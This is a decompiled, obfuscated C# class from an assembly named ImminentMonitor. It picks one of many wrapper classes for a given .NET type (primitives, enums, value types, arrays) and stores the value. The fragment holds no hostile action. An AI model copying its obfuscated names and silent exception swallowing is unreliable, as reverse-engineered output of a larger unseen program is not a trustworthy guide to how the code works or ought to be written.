// Decompiled with JetBrains decompiler
// Type: Class80
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using System;
using System.Runtime.Serialization;

internal static class Class80
{
  private static bool smethod_0<T>(Type type_0)
  {
    Type c = typeof (T);
    return (object) type_0 == (object) c || type_0.IsSubclassOf(c);
  }

  public static Class45 smethod_1(object object_0, Type type_0)
  {
    if (object_0 is Class45 class45_1)
      return class45_1;
    if ((object) type_0 == null)
    {
      if (object_0 == null)
        return (Class45) new Class49();
      type_0 = object_0.GetType();
    }
    type_0 = Class25.smethod_1(type_0);
    Class45 class45_2;
    if ((object) type_0 == (object) Class20.type_0)
    {
      class45_2 = (Class45) new Class49();
      if (object_0 != null && (object) object_0.GetType() != (object) Class20.type_0)
        class45_2.method_1(object_0.GetType());
    }
    else if (Class80.smethod_0<Array>(type_0))
      class45_2 = (Class45) new Class60();
    else if (Class80.smethod_0<string>(type_0))
      class45_2 = (Class45) new Class66();
    else if (Class80.smethod_0<IntPtr>(type_0))
      class45_2 = (Class45) new Class67();
    else if (Class80.smethod_0<UIntPtr>(type_0))
      class45_2 = (Class45) new Class65();
    else if (Class80.smethod_0<ulong>(type_0))
      class45_2 = (Class45) new Class62();
    else if (Class80.smethod_0<uint>(type_0))
      class45_2 = (Class45) new Class64();
    else if (Class80.smethod_0<ushort>(type_0))
      class45_2 = (Class45) new Class69();
    else if (Class80.smethod_0<long>(type_0))
      class45_2 = (Class45) new Class63();
    else if (Class80.smethod_0<int>(type_0))
      class45_2 = (Class45) new Class46();
    else if (Class80.smethod_0<short>(type_0))
      class45_2 = (Class45) new Class70();
    else if (Class80.smethod_0<byte>(type_0))
      class45_2 = (Class45) new Class51();
    else if (Class80.smethod_0<sbyte>(type_0))
      class45_2 = (Class45) new Class61();
    else if (Class80.smethod_0<double>(type_0))
      class45_2 = (Class45) new Class48();
    else if (Class80.smethod_0<float>(type_0))
      class45_2 = (Class45) new Class50();
    else if (Class80.smethod_0<bool>(type_0))
      class45_2 = (Class45) new Class47();
    else if (Class80.smethod_0<char>(type_0))
      class45_2 = (Class45) new Class72();
    else if (Class20.smethod_0(type_0))
    {
      Class49 class49 = new Class49();
      class49.method_1(type_0);
      class45_2 = (Class45) class49;
    }
    else
    {
      if (Class80.smethod_0<Enum>(type_0))
        return (Class45) new Class59(object_0 != null ? ((object) type_0 != (object) Class20.type_3 || !(object_0 is Enum) ? (Enum) Enum.ToObject(type_0, object_0) : (Enum) object_0) : ((object) type_0 != (object) Class20.type_3 ? (Enum) Activator.CreateInstance(type_0) : (Enum) null));
      if (Class80.smethod_0<ValueType>(type_0))
      {
        Class45 class45_3;
        if (object_0 == null)
        {
          class45_3 = (Class45) new Class71((object) type_0 != (object) Class20.type_2 ? ((object) type_0 != (object) Class20.type_4 ? Activator.CreateInstance(type_0) : (object) null) : FormatterServices.GetSafeUninitializedObject(Class20.type_2));
        }
        else
        {
          if ((object) object_0.GetType() != (object) type_0)
          {
            try
            {
              object_0 = Convert.ChangeType(object_0, type_0);
            }
            catch
            {
            }
          }
          class45_3 = (Class45) new Class71(object_0);
        }
        return class45_3;
      }
      class45_2 = (Class45) new Class49();
    }
    if (object_0 != null)
      class45_2.vmethod_1(object_0);
    return class45_2;
  }
}
